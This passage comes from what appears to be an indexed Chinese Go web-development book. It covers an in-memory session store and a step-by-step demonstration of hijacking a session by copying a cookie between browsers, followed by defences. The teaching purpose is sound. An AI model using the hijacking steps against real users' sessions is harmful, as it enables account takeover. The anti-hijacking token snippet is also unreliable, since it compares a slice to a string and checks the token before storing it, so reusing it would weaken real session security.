session\u5b58\u50a8","text":"<p>\u4e0a\u4e00\u8282\u6211\u4eec\u4ecb\u7ecd\u4e86Session\u7ba1\u7406\u5668\u7684\u5b9e\u73b0\u539f\u7406\uff0c\u5b9a\u4e49\u4e86\u5b58\u50a8session\u7684\u63a5\u53e3\uff0c\u8fd9\u5c0f\u8282\u6211\u4eec\u5c06\u793a\u4f8b\u4e00\u4e2a\u57fa\u4e8e\u5185\u5b58\u7684session\u5b58\u50a8\u63a5\u53e3\u7684\u5b9e\u73b0\uff0c\u5176\u4ed6\u7684\u5b58\u50a8\u65b9\u5f0f\uff0c\u8bfb\u8005\u53ef\u4ee5\u81ea\u884c\u53c2\u8003\u793a\u4f8b\u6765\u5b9e\u73b0\uff0c\u5185\u5b58\u7684\u5b9e\u73b0\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u4ee3\u7801 <pre><code>package memory\n\nimport (\n\"container/list\"\n\"github.com/astaxie/session\"\n\"sync\"\n\"time\"\n)\n\nvar pder = &amp;Provider{list: list.New()}\n\ntype SessionStore struct {\nsid          string                      //session id\u552f\u4e00\u6807\u793a\ntimeAccessed time.Time                   //\u6700\u540e\u8bbf\u95ee\u65f6\u95f4\nvalue        map[interface{}]interface{} //session\u91cc\u9762\u5b58\u50a8\u7684\u503c\n}\n\nfunc (st *SessionStore) Set(key, value interface{}) error {\nst.value[key] = value\npder.SessionUpdate(st.sid)\nreturn nil\n}\n\nfunc (st *SessionStore) Get(key interface{}) interface{} {\npder.SessionUpdate(st.sid)\nif v, ok := st.value[key]; ok {\nreturn v\n} else {\nreturn nil\n}\n}\n\nfunc (st *SessionStore) Delete(key interface{}) error {\ndelete(st.value, key)\npder.SessionUpdate(st.sid)\nreturn nil\n}\n\nfunc (st *SessionStore) SessionID() string {\nreturn st.sid\n}\n\ntype Provider struct {\nlock     sync.Mutex               //\u7528\u6765\u9501\nsessions map[string]*list.Element //\u7528\u6765\u5b58\u50a8\u5728\u5185\u5b58\nlist     *list.List               //\u7528\u6765\u505agc\n}\n\nfunc (pder *Provider) SessionInit(sid string) (session.Session, error) {\npder.lock.Lock()\ndefer pder.lock.Unlock()\nv := make(map[interface{}]interface{}, 0)\nnewsess := &amp;SessionStore{sid: sid, timeAccessed: time.Now(), value: v}\nelement := pder.list.PushBack(newsess)\npder.sessions[sid] = element\nreturn newsess, nil\n}\n\nfunc (pder *Provider) SessionRead(sid string) (session.Session, error) {\nif element, ok := pder.sessions[sid]; ok {\nreturn element.Value.(*SessionStore), nil\n} else {\nsess, err := pder.SessionInit(sid)\nreturn sess, err\n}\nreturn nil, nil\n}\n\nfunc (pder *Provider) SessionDestroy(sid string) error {\nif element, ok := pder.sessions[sid]; ok {\ndelete(pder.sessions, sid)\npder.list.Remove(element)\nreturn nil\n}\nreturn nil\n}\n\nfunc (pder *Provider) SessionGC(maxlifetime int64) {\npder.lock.Lock()\ndefer pder.lock.Unlock()\n\nfor {\nelement := pder.list.Back()\nif element == nil {\nbreak\n}\nif (element.Value.(*SessionStore).timeAccessed.Unix() + maxlifetime) &lt; time.Now().Unix() {\npder.list.Remove(element)\ndelete(pder.sessions, element.Value.(*SessionStore).sid)\n} else {\nbreak\n}\n}\n}\n\nfunc (pder *Provider) SessionUpdate(sid string) error {\npder.lock.Lock()\ndefer pder.lock.Unlock()\nif element, ok := pder.sessions[sid]; ok {\nelement.Value.(*SessionStore).timeAccessed = time.Now()\npder.list.MoveToFront(element)\nreturn nil\n}\nreturn nil\n}\n\nfunc init() {\npder.sessions = make(map[string]*list.Element, 0)\nsession.Register(\"memory\", pder)\n}\n</code></pre> \u4e0a\u9762\u8fd9\u4e2a\u4ee3\u7801\u5b9e\u73b0\u4e86\u4e00\u4e2a\u5185\u5b58\u5b58\u50a8\u7684session\u673a\u5236\u3002\u901a\u8fc7init\u51fd\u6570\u6ce8\u518c\u5230session\u7ba1\u7406\u5668\u4e2d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u65b9\u4fbf\u7684\u8c03\u7528\u4e86\u3002\u6211\u4eec\u5982\u4f55\u6765\u8c03\u7528\u8be5\u5f15\u64ce\u5462\uff1f\u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801 <pre><code>import (\n\"github.com/astaxie/session\"\n_ \"github.com/astaxie/session/providers/memory\"\n)\n</code></pre> \u5f53import\u7684\u65f6\u5019\u5df2\u7ecf\u6267\u884c\u4e86memory\u51fd\u6570\u91cc\u9762\u7684init\u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u5df2\u7ecf\u6ce8\u518c\u5230session\u7ba1\u7406\u5668\u4e2d\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86\uff0c\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u5c31\u53ef\u4ee5\u521d\u59cb\u5316\u4e00\u4e2asession\u7ba1\u7406\u5668\uff1a <pre><code>var globalSessions *session.Manager\n\n//\u7136\u540e\u5728init\u51fd\u6570\u4e2d\u521d\u59cb\u5316\nfunc init() {\nglobalSessions, _ = session.NewManager(\"memory\", \"gosessionid\", 3600)\ngo globalSessions.GC()\n}\n</code></pre></p>"},{"location":"06.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go\u5982\u4f55\u4f7f\u7528session</li> <li>\u4e0b\u4e00\u8282: \u9884\u9632session\u52ab\u6301</li> </ul>"},{"location":"06.4/","title":"6.4 \u9884\u9632session\u52ab\u6301","text":"<p>session\u52ab\u6301\u662f\u4e00\u79cd\u5e7f\u6cdb\u5b58\u5728\u7684\u6bd4\u8f83\u4e25\u91cd\u7684\u5b89\u5168\u5a01\u80c1\uff0c\u5728session\u6280\u672f\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7session\u7684\u6807\u8bc6\u7b26\u6765\u7ef4\u62a4\u4f1a\u8bdd\uff0c \u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u5f88\u5bb9\u6613\u5c31\u80fd\u88ab\u55c5\u63a2\u5230\uff0c\u4ece\u800c\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u3002\u5b83\u662f\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u4e00\u79cd\u7c7b\u578b\u3002</p> <p>\u672c\u8282\u5c06\u901a\u8fc7\u4e00\u4e2a\u5b9e\u4f8b\u6765\u6f14\u793a\u4f1a\u8bdd\u52ab\u6301\uff0c\u5e0c\u671b\u901a\u8fc7\u8fd9\u4e2a\u5b9e\u4f8b\uff0c\u80fd\u8ba9\u8bfb\u8005\u66f4\u597d\u5730\u7406\u89e3session\u7684\u672c\u8d28\u3002</p>"},{"location":"06.4/#session","title":"session\u52ab\u6301\u8fc7\u7a0b","text":"<p>\u6211\u4eec\u5199\u4e86\u5982\u4e0b\u7684\u4ee3\u7801\u6765\u5c55\u793a\u4e00\u4e2acount\u8ba1\u6570\u5668\uff1a <pre><code>func count(w http.ResponseWriter, r *http.Request) {\nsess := globalSessions.SessionStart(w, r)\nct := sess.Get(\"countnum\")\nif ct == nil {\nsess.Set(\"countnum\", 1)\n} else {\nsess.Set(\"countnum\", (ct.(int) + 1))\n}\nt, _ := template.ParseFiles(\"count.gtpl\")\nw.Header().Set(\"Content-Type\", \"text/html\")\nt.Execute(w, sess.Get(\"countnum\"))\n}\n</code></pre> count.gtpl\u7684\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a <pre><code>Hi. Now count:{{.}}\n</code></pre> \u7136\u540e\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u91cc\u9762\u5237\u65b0\u53ef\u4ee5\u770b\u5230\u5982\u4e0b\u5185\u5bb9\uff1a</p> <p></p> <p>\u56fe6.4 \u6d4f\u89c8\u5668\u7aef\u663e\u793acount\u6570</p> <p>\u968f\u7740\u5237\u65b0\uff0c\u6570\u5b57\u5c06\u4e0d\u65ad\u589e\u957f\uff0c\u5f53\u6570\u5b57\u663e\u793a\u4e3a6\u7684\u65f6\u5019\uff0c\u6253\u5f00\u6d4f\u89c8\u5668(\u4ee5chrome\u4e3a\u4f8b\uff09\u7684cookie\u7ba1\u7406\u5668\uff0c\u53ef\u4ee5\u770b\u5230\u7c7b\u4f3c\u5982\u4e0b\u7684\u4fe1\u606f\uff1a</p> <p></p> <p>\u56fe6.5 \u83b7\u53d6\u6d4f\u89c8\u5668\u7aef\u4fdd\u5b58\u7684cookie</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u6b65\u9aa4\u6700\u4e3a\u5173\u952e: \u6253\u5f00\u53e6\u4e00\u4e2a\u6d4f\u89c8\u5668(\u8fd9\u91cc\u6211\u6253\u5f00\u4e86firefox\u6d4f\u89c8\u5668),\u590d\u5236chrome\u5730\u5740\u680f\u91cc\u7684\u5730\u5740\u5230\u65b0\u6253\u5f00\u7684\u6d4f\u89c8\u5668\u7684\u5730\u5740\u680f\u4e2d\u3002\u7136\u540e\u6253\u5f00firefox\u7684cookie\u6a21\u62df\u63d2\u4ef6\uff0c\u65b0\u5efa\u4e00\u4e2acookie\uff0c\u628a\u6309\u4e0a\u56fe\u4e2dcookie\u5185\u5bb9\u539f\u6837\u5728firefox\u4e2d\u91cd\u5efa\u4e00\u4efd:</p> <p></p> <p>\u56fe6.6 \u6a21\u62dfcookie</p> <p>\u56de\u8f66\u540e\uff0c\u4f60\u5c06\u770b\u5230\u5982\u4e0b\u5185\u5bb9\uff1a</p> <p></p> <p>\u56fe6.7 \u52ab\u6301session\u6210\u529f</p> <p>\u53ef\u4ee5\u770b\u5230\u867d\u7136\u6362\u4e86\u6d4f\u89c8\u5668\uff0c\u4f46\u662f\u6211\u4eec\u5374\u83b7\u5f97\u4e86sessionID\uff0c\u7136\u540e\u6a21\u62df\u4e86cookie\u5b58\u50a8\u7684\u8fc7\u7a0b\u3002\u8fd9\u4e2a\u4f8b\u5b50\u662f\u5728\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u505a\u7684\uff0c\u4e0d\u8fc7\u5373\u4f7f\u6362\u7528\u4e24\u53f0\u6765\u505a\uff0c\u5176\u7ed3\u679c\u4ecd\u7136\u4e00\u6837\u3002\u6b64\u65f6\u5982\u679c\u4ea4\u66ff\u70b9\u51fb\u4e24\u4e2a\u6d4f\u89c8\u5668\u91cc\u7684\u94fe\u63a5\u4f60\u4f1a\u53d1\u73b0\u5b83\u4eec\u5176\u5b9e\u64cd\u7eb5\u7684\u662f\u540c\u4e00\u4e2a\u8ba1\u6570\u5668\u3002\u4e0d\u5fc5\u60ca\u8bb6\uff0c\u6b64\u5904firefox\u76d7\u7528\u4e86chrome\u548cgoserver\u4e4b\u95f4\u7684\u7ef4\u6301\u4f1a\u8bdd\u7684\u94a5\u5319\uff0c\u5373gosessionid\uff0c\u8fd9\u662f\u4e00\u79cd\u7c7b\u578b\u7684\u201c\u4f1a\u8bdd\u52ab\u6301\u201d\u3002\u5728goserver\u770b\u6765\uff0c\u5b83\u4ecehttp\u8bf7\u6c42\u4e2d\u5f97\u5230\u4e86\u4e00\u4e2agosessionid\uff0c\u7531\u4e8eHTTP\u534f\u8bae\u7684\u65e0\u72b6\u6001\u6027\uff0c\u5b83\u65e0\u6cd5\u5f97\u77e5\u8fd9\u4e2agosessionid\u662f\u4ecechrome\u90a3\u91cc\u201c\u52ab\u6301\u201d\u6765\u7684\uff0c\u5b83\u4f9d\u7136\u4f1a\u53bb\u67e5\u627e\u5bf9\u5e94\u7684session\uff0c\u5e76\u6267\u884c\u76f8\u5173\u8ba1\u7b97\u3002\u4e0e\u6b64\u540c\u65f6 chrome\u4e5f\u65e0\u6cd5\u5f97\u77e5\u81ea\u5df1\u4fdd\u6301\u7684\u4f1a\u8bdd\u5df2\u7ecf\u88ab\u201c\u52ab\u6301\u201d\u3002</p>"},{"location":"06.4/#session_1","title":"session\u52ab\u6301\u9632\u8303","text":""},{"location":"06.4/#cookieonlytoken","title":"cookieonly\u548ctoken","text":"<p>\u901a\u8fc7\u4e0a\u9762session\u52ab\u6301\u7684\u7b80\u5355\u6f14\u793a\u53ef\u4ee5\u4e86\u89e3\u5230session\u4e00\u65e6\u88ab\u5176\u4ed6\u4eba\u52ab\u6301\uff0c\u5c31\u975e\u5e38\u5371\u9669\uff0c\u52ab\u6301\u8005\u53ef\u4ee5\u5047\u88c5\u6210\u88ab\u52ab\u6301\u8005\u8fdb\u884c\u5f88\u591a\u975e\u6cd5\u64cd\u4f5c\u3002\u90a3\u4e48\u5982\u4f55\u6709\u6548\u7684\u9632\u6b62session\u52ab\u6301\u5462\uff1f</p> <p>\u5176\u4e2d\u4e00\u4e2a\u89e3\u51b3\u65b9\u6848\u5c31\u662fsessionID\u7684\u503c\u53ea\u5141\u8bb8cookie\u8bbe\u7f6e\uff0c\u800c\u4e0d\u662f\u901a\u8fc7URL\u91cd\u7f6e\u65b9\u5f0f\u8bbe\u7f6e\uff0c\u540c\u65f6\u8bbe\u7f6ecookie\u7684httponly\u4e3atrue,\u8fd9\u4e2a\u5c5e\u6027\u662f\u8bbe\u7f6e\u662f\u5426\u53ef\u901a\u8fc7\u5ba2\u6237\u7aef\u811a\u672c\u8bbf\u95ee\u8fd9\u4e2a\u8bbe\u7f6e\u7684cookie\uff0c\u7b2c\u4e00\u8fd9\u4e2a\u53ef\u4ee5\u9632\u6b62\u8fd9\u4e2acookie\u88abXSS\u8bfb\u53d6\u4ece\u800c\u5f15\u8d77session\u52ab\u6301\uff0c\u7b2c\u4e8ccookie\u8bbe\u7f6e\u4e0d\u4f1a\u50cfURL\u91cd\u7f6e\u65b9\u5f0f\u90a3\u4e48\u5bb9\u6613\u83b7\u53d6sessionID\u3002</p> <p>\u7b2c\u4e8c\u6b65\u5c31\u662f\u5728\u6bcf\u4e2a\u8bf7\u6c42\u91cc\u9762\u52a0\u4e0atoken\uff0c\u5b9e\u73b0\u7c7b\u4f3c\u524d\u9762\u7ae0\u8282\u91cc\u9762\u8bb2\u7684\u9632\u6b62form\u91cd\u590d\u9012\u4ea4\u7c7b\u4f3c\u7684\u529f\u80fd\uff0c\u6211\u4eec\u5728\u6bcf\u4e2a\u8bf7\u6c42\u91cc\u9762\u52a0\u4e0a\u4e00\u4e2a\u9690\u85cf\u7684token\uff0c\u7136\u540e\u6bcf\u6b21\u9a8c\u8bc1\u8fd9\u4e2atoken\uff0c\u4ece\u800c\u4fdd\u8bc1\u7528\u6237\u7684\u8bf7\u6c42\u90fd\u662f\u552f\u4e00\u6027\u3002 <pre><code>h := md5.New()\nsalt:=\"astaxie%^7&amp;8888\"\nio.WriteString(h,salt+time.Now().String())\ntoken:=fmt.Sprintf(\"%x\",h.Sum(nil))\nif r.Form[\"token\"]!=token{\n//\u63d0\u793a\u767b\u5f55\n}\nsess.Set(\"token\",token)\n</code></pre></p>"},{"location":"06.4/#sid","title":"\u95f4\u9694\u751f\u6210\u65b0\u7684SID","text":"<p>\u8fd8\u6709\u4e00\u4e2a\u89e3\u51b3\u65b9\u6848\u5c31\u662f\uff0c\u6211\u4eec\u7ed9session\u989d\u5916\u8bbe\u7f6e\u4e00\u4e2a\u521b\u5efa\u65f6\u95f4\u7684\u503c\uff0c\u4e00\u65e6\u8fc7\u4e86\u4e00\u5b9a\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u9500\u6bc1\u8fd9\u4e2asessionID\uff0c\u91cd\u65b0\u751f\u6210\u65b0\u7684session\uff0c\u8fd9\u6837\u53ef\u4ee5\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u6b62session\u52ab\u6301\u7684\u95ee\u9898\u3002 <pre><code>createtime := sess.Get(\"createtime\")\nif createtime == nil {\nsess.Set(\"createtime\", time.Now().Unix())\n} else if (createtime.(int64) + 60) &lt; (time.Now().Unix()) {\nglobalSessions.SessionDestroy(w, r)\nsess = globalSessions.SessionStart(w, r)\n}\n</code></pre> session\u542f\u52a8\u540e\uff0c\u6211\u4eec\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u503c\uff0c\u7528\u4e8e\u8bb0\u5f55\u751f\u6210sessionID\u7684\u65f6\u95f4\u3002\u901a\u8fc7\u5224\u65ad\u6bcf\u6b21\u8bf7\u6c42\u662f\u5426\u8fc7\u671f(\u8fd9\u91cc\u8bbe\u7f6e\u4e8660\u79d2)\u5b9a\u671f\u751f\u6210\u65b0\u7684ID\uff0c\u8fd9\u6837\u4f7f\u5f97\u653b\u51fb\u8005\u83b7\u53d6\u6709\u6548sessionID\u7684\u673a\u4f1a\u5927\u5927\u964d\u4f4e\u3002</p> <p>\u4e0a\u9762\u4e24\u4e2a\u624b\u6bb5\u7684\u7ec4\u5408\u53ef\u4ee5\u5728\u5b9e\u8df5\u4e2d\u6d88\u9664session\u52ab\u6301\u7684\u98ce\u9669\uff0c\u4e00\u65b9\u9762\uff0c  \u7531\u4e8esessionID\u9891\u7e41\u6539\u53d8\uff0c\u4f7f\u653b\u51fb\u8005\u96be\u6709\u673a\u4f1a\u83b7\u53d6\u6709\u6548\u7684sessionID\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u56e0\u4e3asessionID\u53ea\u80fd\u5728cookie\u4e2d\u4f20\u9012\uff0c\u7136\u540e\u8bbe\u7f6e\u4e86httponly\uff0c\u6240\u4ee5\u57fa\u4e8eURL\u653b\u51fb\u7684\u53ef\u80fd\u6027\u4e3a\u96f6\uff0c\u540c\u65f6\u88abXSS\u83b7\u53d6sessionID\u4e5f\u4e0d\u53ef\u80fd\u3002\u6700\u540e\uff0c\u7531\u4e8e\u6211\u4eec\u8fd8\u8bbe\u7f6e\u4e86MaxAge=0\uff0c\u8fd9\u6837\u5c31\u76f8\u5f53\u4e8esession cookie\u4e0d\u4f1a\u7559\u5728\u6d4f\u89c8\u5668\u7684\u5386\u53f2\u8bb0\u5f55\u91cc\u9762\u3002</p>"},{"location":"06.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: session\u5b58\u50a8</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"06.5/","title":"6.5 \u5c0f\u7ed3","text":"<p>\u8fd9\u7ae0\u6211\u4eec\u5b66\u4e60\u4e86\u4ec0\u4e48\u662fsession\uff0c\u4ec0\u4e48\u662fcookie\uff0c\u4ee5\u53ca\u4ed6\u4eec\u4e24\u8005\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u4f46\u662f\u76ee\u524dGo\u5b98\u65b9\u6807\u51c6\u5305\u91cc\u9762\u4e0d\u652f\u6301session\uff0c\u6240\u4ee5\u6211\u4eec\u8bbe\u8ba1\u4e86\u4e00\u4e2asession\u7ba1\u7406\u5668\uff0c\u5b9e\u73b0\u4e86session\u4ece\u521b\u5efa\u5230\u9500\u6bc1\u7684\u6574\u4e2a\u8fc7\u7a0b\u3002\u7136\u540e\u5b9a\u4e49\u4e86Provider\u7684\u63a5\u53e3\uff0c\u4f7f\u5f97\u53ef\u4ee5\u652f\u6301\u5404\u79cd\u540e\u7aef\u7684session\u5b58\u50a8\uff0c\u7136\u540e\u6211\u4eec\u5728\u7b2c\u4e09\u5c0f\u8282\u91cc\u9762\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528\u5185\u5b58\u5b58\u50a8\u6765\u5b9e\u73b0session\u7684\u7ba1\u7406\u3002\u7b2c\u56db\u5c0f\u8282\u6211\u4eec\u8bb2\u89e3\u4e86session\u52ab\u6301\u7684\u8fc7\u7a0b\uff0c\u4ee5\u53ca\u6211\u4eec\u5982\u4f55\u6709\u6548\u7684\u6765\u9632\u6b62session\u52ab\u6301\u3002\u901a\u8fc7\u8fd9\u4e00\u7ae0\u7684\u8bb2\u89e3\uff0c\u5e0c\u671b\u80fd\u591f\u8ba9\u8bfb\u8005\u4e86\u89e3\u6574\u4e2asesison\u7684\u6267\u884c\u539f\u7406\u4ee5\u53ca\u5982\u4f55\u5b9e\u73b0\uff0c\u800c\u4e14\u662f\u5982\u4f55\u66f4\u52a0\u5b89\u5168\u7684\u4f7f\u7528session\u3002</p>"},{"location":"06.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: session\u5b58\u50a8</li> <li>\u4e0b\u4e00\u7ae0: \u6587\u672c\u5904\u7406</li> </ul>"},{"location":"07.0/","title":"7 \u6587\u672c\u5904\u7406","text":"<p>Web\u5f00\u53d1\u4e2d\u5bf9\u4e8e\u6587\u672c\u5904\u7406\u662f\u975e\u5e38\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u5bf9\u8f93\u51fa\u6216\u8005\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c\u5904\u7406\uff0c\u8fd9\u91cc\u7684\u6587\u672c\u5305\u62ec\u5b57\u7b26\u4e32\u3001\u6570\u5b57\u3001Json\u3001XML\u7b49\u7b49\u3002Go\u8bed\u8a00\u4f5c\u4e3a\u4e00\u95e8\u9ad8\u6027\u80fd\u7684\u8bed\u8a00\uff0c\u5bf9\u8fd9\u4e9b\u6587\u672c\u7684\u5904\u7406\u90fd\u6709\u5b98\u65b9\u7684\u6807\u51c6\u5e93\u6765\u652f\u6301\u3002\u800c\u4e14\u5728\u4f60\u4f7f\u7528\u4e2d\u4f60\u4f1a\u53d1\u73b0Go\u6807\u51c6\u5e93\u7684\u4e00\u4e9b\u8bbe\u8ba1\u76f8\u5f53\u7684\u5de7\u5999\uff0c\u800c\u4e14\u5bf9\u4e8e\u4f7f\u7528\u8005\u6765\u8bf4\u4e5f\u5f88\u65b9\u4fbf\u5c31\u80fd\u5904\u7406\u8fd9\u4e9b\u6587\u672c\u3002\u672c\u7ae0\u6211\u4eec\u5c06\u901a\u8fc7\u56db\u4e2a\u5c0f\u8282\u7684\u4ecb\u7ecd\uff0c\u8ba9\u7528\u6237\u5bf9Go\u8bed\u8a00\u5904\u7406\u6587\u672c\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u8ba4\u8bc6\u3002</p> <p>XML\u662f\u76ee\u524d\u5f88\u591a\u6807\u51c6\u63a5\u53e3\u7684\u4ea4\u4e92\u8bed\u8a00\uff0c\u5f88\u591a\u65f6\u5019\u548c\u4e00\u4e9bJava\u7f16\u5199\u7684webserver\u8fdb\u884c\u4ea4\u4e92\u90fd\u662f\u57fa\u4e8eXML\u6807\u51c6\u8fdb\u884c\u4ea4\u4e92\uff0c7.1\u5c0f\u8282\u5c06\u4ecb\u7ecd\u5982\u4f55\u5904\u7406XML\u6587\u672c\uff0c\u6211\u4eec\u4f7f\u7528XML\u4e4b\u540e\u53d1\u73b0\u5b83\u592a\u590d\u6742\u4e86\uff0c\u73b0\u5728\u5f88\u591a\u4e92\u8054\u7f51\u4f01\u4e1a\u5bf9\u5916\u7684API\u5927\u591a\u6570\u91c7\u7528\u4e86JSON\u683c\u5f0f\uff0c\u8fd9\u79cd\u683c\u5f0f\u63cf\u8ff0\u7b80\u5355\uff0c\u4f46\u662f\u53c8\u80fd\u5f88\u597d\u7684\u8868\u8fbe\u610f\u601d\uff0c7.2\u5c0f\u8282\u6211\u4eec\u5c06\u8bb2\u8ff0\u5982\u4f55\u6765\u5904\u7406\u8fd9\u6837\u7684JSON\u683c\u5f0f\u6570\u636e\u3002\u6b63\u5219\u662f\u4e00\u4e2a\u8ba9\u4eba\u53c8\u7231\u53c8\u6068\u7684\u5de5\u5177\uff0c\u5b83\u5904\u7406\u6587\u672c\u7684\u80fd\u529b\u975e\u5e38\u5f3a\u5927\uff0c\u6211\u4eec\u5728\u524d\u9762\u8868\u5355\u9a8c\u8bc1\u91cc\u9762\u5df2\u7ecf\u6709\u6240\u9886\u7565\u5b83\u7684\u5f3a\u5927\uff0c7.3\u5c0f\u8282\u5c06\u8be6\u7ec6\u7684\u66f4\u6df1\u5165\u7684\u8bb2\u89e3\u5982\u4f55\u5229\u7528\u597dGo\u7684\u6b63\u5219\u3002Web\u5f00\u53d1\u4e2d\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u90e8\u5206\u5c31\u662fMVC\u5206\u79bb\uff0c\u5728Go\u8bed\u8a00\u7684Web\u5f00\u53d1\u4e2dV\u6709\u4e00\u4e2a\u4e13\u95e8\u7684\u5305\u6765\u652f\u6301<code>template</code>\uff0c7.4\u5c0f\u8282\u5c06\u8be6\u7ec6\u7684\u8bb2\u89e3\u5982\u4f55\u4f7f\u7528\u6a21\u7248\u6765\u8fdb\u884c\u8f93\u51fa\u5185\u5bb9\u30027.5\u5c0f\u8282\u5c06\u8be6\u7ec6\u4ecb\u7ecd\u5982\u4f55\u8fdb\u884c\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u64cd\u4f5c\u30027.6\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5b57\u7b26\u4e32\u7684\u76f8\u5173\u64cd\u4f5c\u3002</p>"},{"location":"07.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"07.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u516d\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: XML\u5904\u7406</li> </ul>"},{"location":"07.1/","title":"7.1 XML\u5904\u7406","text":"<p>XML\u4f5c\u4e3a\u4e00\u79cd\u6570\u636e\u4ea4\u6362\u548c\u4fe1\u606f\u4f20\u9012\u7684\u683c\u5f0f\u5df2\u7ecf\u5341\u5206\u666e\u53ca\u3002\u800c\u968f\u7740Web\u670d\u52a1\u65e5\u76ca\u5e7f\u6cdb\u7684\u5e94\u7528\uff0c\u73b0\u5728XML\u5728\u65e5\u5e38\u7684\u5f00\u53d1\u5de5\u4f5c\u4e2d\u4e5f\u626e\u6f14\u4e86\u6108\u53d1\u91cd\u8981\u7684\u89d2\u8272\u3002\u8fd9\u4e00\u5c0f\u8282\uff0c \u6211\u4eec\u5c06\u5c31Go\u8bed\u8a00\u6807\u51c6\u5305\u4e2d\u7684XML\u76f8\u5173\u5904\u7406\u7684\u5305\u8fdb\u884c\u4ecb\u7ecd\u3002</p> <p>\u8fd9\u4e2a\u5c0f\u8282\u4e0d\u4f1a\u6d89\u53caXML\u89c4\u8303\u76f8\u5173\u7684\u5185\u5bb9\uff08\u5982\u9700\u4e86\u89e3\u76f8\u5173\u77e5\u8bc6\u8bf7\u53c2\u8003\u5176\u4ed6\u6587\u732e\uff09\uff0c\u800c\u662f\u4ecb\u7ecd\u5982\u4f55\u7528Go\u8bed\u8a00\u6765\u7f16\u89e3\u7801XML\u6587\u4ef6\u76f8\u5173\u7684\u77e5\u8bc6\u3002</p> <p>\u5047\u5982\u4f60\u662f\u4e00\u540d\u8fd0\u7ef4\u4eba\u5458\uff0c\u4f60\u4e3a\u4f60\u6240\u7ba1\u7406\u7684\u6240\u6709\u670d\u52a1\u5668\u751f\u6210\u4e86\u5982\u4e0b\u5185\u5bb9\u7684xml\u7684\u914d\u7f6e\u6587\u4ef6\uff1a <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;servers version=\"1\"&gt;\n&lt;server&gt;\n&lt;serverName&gt;Shanghai_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.1&lt;/serverIP&gt;\n&lt;/server&gt;\n&lt;server&gt;\n&lt;serverName&gt;Beijing_VPN&lt;/serverName&gt;\n&lt;serverIP&gt;127.0.0.2&lt;/serverIP&gt;\n&lt;/server&gt;\n&lt;/servers&gt;\n</code></pre> \u4e0a\u9762\u7684XML\u6587\u6863\u63cf\u8ff0\u4e86\u4e24\u4e2a\u670d\u52a1\u5668\u7684\u4fe1\u606f\uff0c\u5305\u542b\u4e86\u670d\u52a1\u5668\u540d\u548c\u670d\u52a1\u5668\u7684IP\u4fe1\u606f\uff0c\u63a5\u4e0b\u6765\u7684Go\u4f8b\u5b50\u4ee5\u6b64XML\u63cf\u8ff0\u7684\u4fe1\u606f\u8fdb\u884c\u64cd\u4f5c\u3002</p>"},{"location":"07.1/#xml","title":"\u89e3\u6790XML","text":"<p>\u5982\u4f55\u89e3\u6790\u5982\u4e0a\u8fd9\u4e2aXML\u6587\u4ef6\u5462\uff1f \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7xml\u5305\u7684<code>Unmarshal</code>\u51fd\u6570\u6765\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684 <pre><code>func Unmarshal(data []byte, v interface{}) error\n</code></pre> data\u63a5\u6536\u7684\u662fXML\u6570\u636e\u6d41\uff0cv\u662f\u9700\u8981\u8f93\u51fa\u7684\u7ed3\u6784\uff0c\u5b9a\u4e49\u4e3ainterface\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u628aXML\u8f6c\u6362\u4e3a\u4efb\u610f\u7684\u683c\u5f0f\u3002\u6211\u4eec\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecdstruct\u7684\u8f6c\u6362\uff0c\u56e0\u4e3astruct\u548cXML\u90fd\u6709\u7c7b\u4f3c\u6811\u7ed3\u6784\u7684\u7279\u5f81\u3002</p> <p>\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>package main\n\nimport (\n\"encoding/xml\"\n\"fmt\"\n\"io/ioutil\"\n\"os\"\n)\n\ntype Recurlyservers struct {\nXMLName     xml.Name `xml:\"servers\"`\nVersion     string   `xml:\"version,attr\"`\nSvs         []server `xml:\"server\"`\nDescription string   `xml:\",innerxml\"`\n}\n\ntype server struct {\nXMLName    xml.Name `xml:\"server\"`\nServerName string   `xml:\"serverName\"`\nServerIP   string   `xml:\"serverIP\"`\n}\n\nfunc main() {\nfile, err := 